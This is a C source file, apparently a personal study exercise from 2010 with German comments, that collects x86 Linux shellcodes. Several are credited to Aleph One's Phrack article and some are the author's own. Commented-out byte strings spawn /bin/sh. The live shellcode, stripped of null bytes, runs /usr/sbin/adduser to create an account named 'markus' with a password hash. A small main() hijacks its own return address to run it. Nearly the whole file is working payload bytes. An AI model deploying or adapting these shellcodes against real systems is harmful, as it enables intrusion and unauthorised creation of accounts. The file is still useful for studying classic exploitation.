//Markus Thill
//25.05.2010
//
//In diesem Programm sind unterschiedliche Shellcodes aufgeführt. //Zum Testen wurden einige aus dem Artikel von Aleph One //übernommen!!

/*Öffnen einer Shell: Code aus Phrack*/
/*char shellcode[] =
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";*/

/*Öffnen einer Shell: Mein Code*/
/*char shellcode[] =
    "\xe9\x2a\x00\x00\x00\x5e\x89\x76"
    "\x08\xc6\x46\x07\x00\xc7\x46\x0c"
    "\x00\x00\x00\x00\xb8\x0b\x00\x00"
    "\x00\x89\xf3\x8d\x4e\x08\x8d\x56"
    "\x0c\xcd\x80\xb8\x01\x00\x00\x00"
    "\xbb\x00\x00\x00\x00\xcd\x80\xe8"
    "\xd1\xff\xff\xff\x2f\x62\x69\x6e"
    "\x2f\x73\x68\x00\x5d\xc3";*/

/*Öffnen einer Shell: Code aus Phrack*/
/*char shellcode[] =
	"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
	"\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
	"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
	"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";*/

/*Anlegen des Users markus, PW: markus87*/
/*	
char shellcode[] =
	"\xeb\x48\x5e\x89\x76\x3f\x8d\x46"
	"\x12\x89\x46\x43\x8d\x46\x19\x89"
	"\x46\x47\x8d\x46\x1c\x89\x46\x4b"
	"\xc6\x46\x11\x00\xc6\x46\x18\x00"
	"\xc6\x46\x1b\x00\xc6\x46\x3e\x00"
	"\xc7\x46\x4f\x00\x00\x00\x00\xb8"
	"\x0b\x00\x00\x00\x89\xf3\x8d\x4e"
	"\x3f\x8d\x56\x4f\xcd\x80\xb8\x01"
	"\x00\x00\x00\xbb\x00\x00\x00\x00"
	"\xcd\x80\xe8\xb3\xff\xff\xff\x2f"
	"\x75\x73\x72\x2f\x73\x62\x69\x6e"
	"\x2f\x61\x64\x64\x75\x73\x65\x72"
	"\x23\x6d\x61\x72\x6b\x75\x73\x23"
	"\x2d\x70\x23\x24\x31\x24\x37\xcf"
	"\x76\xd9\x4c\x4b\xcf\xb5\x24\x67"
	"\x53\x55\x4b\x47\x36\x52\x41\x4c"
	"\x7a\x52\x41\x38\x72\x79\x52\x4f"
	"\x63\x54\x73\x47\x30\x23\x00\x5d";*/

/*Anlegen des Users markus, PW: markus87
keine NullBytes vorhanden*/
char shellcode[] =
	"\xeb\x3a\x5e\x89\x76\x3f\x8d\x46"
	"\x12\x89\x46\x43\x8d\x46\x19\x89"
	"\x46\x47\x8d\x46\x1c\x89\x46\x4b"
	"\x31\xc0\x88\x46\x11\x88\x46\x18"
	"\x88\x46\x1b\x88\x46\x3e\x89\x46"
	"\x4f\xb0\x0b\x89\xf3\x8d\x4e\x3f"
	"\x8d\x56\x4f\xcd\x80\x31\xdb\x89"
	"\xd8\x40\xcd\x80\xe8\xc1\xff\xff"
	"\xff\x2f\x75\x73\x72\x2f\x73\x62"
	"\x69\x6e\x2f\x61\x64\x64\x75\x73"
	"\x65\x72\x23\x6d\x61\x72\x6b\x75"
	"\x73\x23\x2d\x70\x23\x24\x31\x24"
	"\x37\xcf\x76\xd9\x4c\x4b\xcf\xb5"
	"\x24\x67\x53\x55\x4b\x47\x36\x52"
	"\x41\x4c\x7a\x52\x41\x38\x72\x79"
	"\x52\x4f\x63\x54\x73\x47\x30\x23";


void main() {
   int *ret;

   ret = (int *)&ret + 2;
   (*ret) = (int)shellcode;

}
